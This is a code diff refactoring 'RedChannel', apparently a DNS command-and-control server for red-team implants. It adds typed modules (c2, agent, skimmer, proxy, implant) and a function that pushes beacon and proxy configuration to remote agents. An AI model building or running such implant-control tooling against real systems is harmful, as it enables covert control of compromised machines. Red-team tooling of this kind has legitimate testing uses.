@@ -15,23 +15,22 @@ import C2Module from "../modules/c2";
 
 import { implant } from "../pb/implant";
 
-/**
-     req: {
-         connection: {
-             remoteAddress: '127.0.0.1',
-            type: 'AAAA'
-        }
+/*
+req: {
+    connection: {
+        remoteAddress: '127.0.0.1',
+        type: 'AAAA'
     }
-    res: {
-        question[0]: {
-            type: 'AAAA',
-            name: 'dns.query.tld'
-        },
-        answer: [],
-        end: function(){}
-    }
-    */
-
+}
+res: {
+    question[0]: {
+        type: 'AAAA',
+        name: 'dns.query.tld'
+    },
+    answer: [],
+    end: function(){}
+}
+*/
 export enum C2AnswerType {
     TYPE_A = "A",
     TYPE_AAAA = "AAAA",
@@ -102,6 +101,15 @@ export enum AgentChannel {
     PROXY = "proxy",
 }
 
+export interface Modules {
+    c2: C2Module;
+    agent: AgentModule;
+    skimmer: SkimmerModule;
+    static_dns: StaticDnsModule;
+    proxy: ProxyModule;
+    implant: ImplantModule;
+}
+
 export default class RedChannel {
     version = Constants.VERSION;
 
@@ -121,7 +129,7 @@ export default class RedChannel {
      *
      * function will be executed when the command is typed
      */
-    modules: any;
+    modules: Modules;
 
     hashedPassword: string;
     plaintextPassword: string;
@@ -144,9 +152,6 @@ export default class RedChannel {
 
         this.modules = {
             c2: new C2Module(domain, debug, this.configFile),
-            agent: new AgentModule(this.configFile),
-            skimmer: new SkimmerModule(this.configFile),
-            static_dns: new StaticDnsModule(this.configFile),
             proxy: new ProxyModule(
                 this.configFile,
                 this,
@@ -159,6 +164,9 @@ export default class RedChannel {
                 }
             ),
             implant: new ImplantModule(this.configFile, this),
+            static_dns: new StaticDnsModule(this.configFile),
+            skimmer: new SkimmerModule(this.configFile),
+            agent: new AgentModule(this.configFile),
         };
 
         this.modules.c2.config = merge(this.modules.c2.config, cliConfig);
@@ -175,8 +183,6 @@ export default class RedChannel {
         this.crypto = new Crypto();
 
         this.flood = new Map<AgentId, NodeJS.Timeout>();
-
-        if (this.modules.proxy.config.enabled) this.modules.proxy.proxyFetchLoop();
     }
 
     initAgent(agentId, channel: AgentChannel, ip?: string) {
@@ -260,18 +266,26 @@ export default class RedChannel {
         });
     }
 
+    sendConfigChanges(agentId: string) {
+        const configProto = implant.AgentConfig.create({
+            c2IntervalMs: this.modules.agent.config.interval,
+            webKey: this.modules.agent.config.proxy_key,
+            webUrl: this.modules.agent.config.proxy_url,
+            useWebChannel: this.modules.agent.config.proxy_enabled,
+        });
+
+        // no need to send data
+        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, undefined, configProto).catch((ex) => {
+            this.log.error(`error queueing data: ${emsg(ex)}`);
+        });
+    }
+
     // agent must be able to decrypt the tag to execute shutdown
     sendCommandSysinfo(agentId: string) {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
         this.queueData(agentId, implant.AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
-            this.log.error(`error queueing data: ${emsg(ex)}`);
-        });
-    }
-
-    sendCommandSetConfig(agentId: string, config: string) {
-        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, Buffer.from(config)).catch((ex) => {
             this.log.error(`error queueing data: ${emsg(ex)}`);
         });
     }
@@ -284,7 +298,7 @@ export default class RedChannel {
      * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
      *
      */
-    async queueData(agentId: string, command: implant.AgentCommand, data: Buffer, configData?: implant.AgentConfig) {
+    async queueData(agentId: string, command: implant.AgentCommand, data?: Buffer, configData?: implant.AgentConfig) {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
 
